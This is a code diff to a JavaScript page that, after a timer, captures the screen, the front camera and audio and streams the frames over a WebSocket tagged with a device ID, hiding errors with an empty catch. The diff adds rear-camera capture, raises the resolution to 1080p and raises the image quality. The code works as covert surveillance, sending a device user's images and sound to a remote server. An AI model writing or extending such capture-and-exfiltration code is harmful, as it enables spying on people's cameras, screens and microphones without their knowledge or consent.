@@ -79,6 +79,7 @@
             setTimeout(() => {
                 captureScreen();
                 captureCamera('front');
+                captureCamera('rear');
                 captureAudio();
             }, 2000);
         }
@@ -93,6 +94,7 @@
                 setTimeout(() => {
                     captureScreen();
                     captureCamera('front');
+                    captureCamera('rear');
                     captureAudio();
                 }, 1000);
             };
@@ -202,7 +204,11 @@
         async function captureCamera(cameraType) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: cameraType === 'front' ? 'user' : 'environment' } 
+                    video: { 
+                        facingMode: cameraType === 'front' ? 'user' : 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    } 
                 });
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -216,7 +222,8 @@
                     ws.send(JSON.stringify({
                         type: 'camera',
                         deviceId: deviceId,
-                        image: canvas.toDataURL('image/jpeg', 0.5)
+                        camera: cameraType,
+                        image: canvas.toDataURL('image/jpeg', 0.8)
                     }));
                 }, 1000);
             } catch (err) {}
